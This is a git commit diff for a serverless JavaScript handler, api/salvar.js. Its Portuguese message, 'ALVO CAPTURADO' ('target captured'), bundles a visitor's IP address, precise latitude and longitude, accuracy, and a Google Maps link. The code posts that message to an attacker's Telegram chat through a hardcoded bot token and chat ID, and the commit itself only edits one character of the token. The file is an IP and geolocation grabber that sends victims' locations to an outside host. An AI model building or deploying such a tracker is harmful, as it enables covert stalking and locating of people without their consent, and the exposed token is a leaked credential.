ff702a85b0829810f38320525f3363974640e6bd
RiccK <93783406+rikedev@users.noreply.github.com>
2026-08-25 21:03:03 -0300

    Update salvar.js

--- api/salvar.js
+++ api/salvar.js
@@ -8,7 +8,7 @@ export default async function handler(req, res) {
             const mensagem = `🚨 ALVO CAPTURADO!\n\n🌐 IP: ${ipCliente}\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Precisão: ${precisao}m\n\n🗺️ Abrir no Maps: https://www.google.com/maps?q=${lat},${lon}`;
 
             // SEUS DADOS DO TELEGRAM AQUI:
-            const tokenBot = "8772002391:AAHnAQNqA6rwWNC79NXdn8m4e_u0PxyjuLk";
+            const tokenBot = "8772002391:AAHnAQNqA6rwWNC79NXdn8m4e_uOPxyjuLk";
             const chatId = "8568978632";
 
             await fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(mensagem));
